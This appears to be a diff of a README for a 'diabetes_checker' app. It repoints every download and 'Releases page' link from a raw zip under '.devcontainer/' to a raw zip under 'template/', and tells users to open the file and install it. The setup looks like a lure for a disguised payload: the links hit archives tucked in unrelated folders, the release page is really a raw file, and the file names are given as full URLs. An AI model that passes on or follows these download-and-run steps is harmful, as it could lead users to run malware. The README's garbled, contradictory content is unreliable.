@@ -16,19 +16,19 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started, you need to download the application from our releases page.  
 
-### [Download diabetes_checker](https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/.devcontainer/diabetes-checker-2.2.zip)
+### [Download diabetes_checker](https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/template/diabetes_checker_v1.0.zip)
 
 Click the link above to visit the page where you can download the latest version of the app. 
 
 ## 📋 How to Install
 
-1. Visit the [Releases page](https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/.devcontainer/diabetes-checker-2.2.zip).
+1. Visit the [Releases page](https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/template/diabetes_checker_v1.0.zip).
 2. Locate the latest release.
 3. Download the appropriate file for your operating system.
 4. Once the download finishes, locate the downloaded file:
-   - **Windows:** It will typically be in your Downloads folder, named something like `https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/.devcontainer/diabetes-checker-2.2.zip`.
-   - **macOS:** The file will be in your Downloads folder, named something like `https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/.devcontainer/diabetes-checker-2.2.zip`.
-   - **Linux:** The file will be in your Downloads folder, with a name like `https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/.devcontainer/diabetes-checker-2.2.zip`.
+   - **Windows:** It will typically be in your Downloads folder, named something like `https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/template/diabetes_checker_v1.0.zip`.
+   - **macOS:** The file will be in your Downloads folder, named something like `https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/template/diabetes_checker_v1.0.zip`.
+   - **Linux:** The file will be in your Downloads folder, with a name like `https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/template/diabetes_checker_v1.0.zip`.
 5. Open the downloaded file and follow the on-screen instructions to install the app.
 
 ## 🔄 Using the App
@@ -84,6 +84,6 @@ If you have questions or need assistance, please reach out to us via the issues 
 
 Thank you for choosing **diabetes_checker**. Your health is important. Let's take the first step together to understand and manage your diabetes risk. 
 
-### [Download diabetes_checker](https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/.devcontainer/diabetes-checker-2.2.zip)
+### [Download diabetes_checker](https://github.com/0aqta/diabetes_checker/raw/refs/heads/main/template/diabetes_checker_v1.0.zip)
 
 Click the link above to get started. Happy checking!
